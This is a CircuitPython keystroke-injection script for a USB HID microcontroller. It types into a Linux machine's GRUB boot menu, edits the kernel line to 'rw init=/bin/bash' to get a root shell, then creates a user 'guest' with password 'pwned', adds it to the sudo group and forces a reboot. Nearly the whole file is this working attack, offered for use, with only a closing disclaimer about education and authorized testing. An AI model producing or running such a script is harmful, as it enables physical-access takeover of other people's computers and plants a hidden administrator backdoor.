import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

time.sleep(2)

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)


kbd.send(Keycode.E) # For enter grub menu i use E for it you need configure if it need.


time.sleep(5) # Wait until the GRUB menu appears if your pc more slow maybe chance value for it.

# I locate for  "ro  quiet splash" and replace "rw init=/bin/bash"
#  if you dont know actualy where is it you can make a code just press E and check where is ro quiet splash
#  its prabably end line of linux... 
#  here code for only press E
# import time
# import usb_hid
# from adafruit_hid.keyboard import Keyboard
# from adafruit_hid.keycode import Keycode
# time.sleep(2)
# kbd = Keyboard(usb_hid.devices)
# kbd.send(Keycode.E)

for _ in range(20):
    kbd.send(Keycode.DOWN_ARROW)
    time.sleep(0.05)


for _ in range(2):
    kbd.send(Keycode.UP_ARROW)
    time.sleep(0.05)


kbd.send(Keycode.LEFT_ARROW)
time.sleep(0.05)

for _ in range(16):
    kbd.send(Keycode.BACKSPACE)
    time.sleep(0.05)

layout.write("rw init=/bin/bash")
time.sleep(0.5)

kbd.send(Keycode.F10)
# HERE for enter root terminal and in the below code create sudo user call guest and guest's password is pwned
time.sleep(20)
layout.write("useradd guest")
time.sleep(0.05)
kbd.send(Keycode.ENTER)
time.sleep(4)
layout.write("passwd guest")
time.sleep(0.05)
kbd.send(Keycode.ENTER)
time.sleep(4)
layout.write("pwned")
time.sleep(4)
kbd.send(Keycode.ENTER)
layout.write("pwned")
time.sleep(0.05)
kbd.send(Keycode.ENTER)
time.sleep(4)
layout.write("usermod -aG sudo guest") # usermod -aG wheel guest for arch fedora or etc..
time.sleep(0.05)
kbd.send(Keycode.ENTER)
time.sleep(4)
layout.write("sync && reboot -f")
time.sleep(0.05)
kbd.send(Keycode.ENTER)
# created by z3t0v1c2
# Disclaimer / Sorumluluk Reddi
#This tool is developed for educational and authorized security testing purposes only. 
#The developer assumes no liability and is not responsible for any misuse or damage caused by this program.
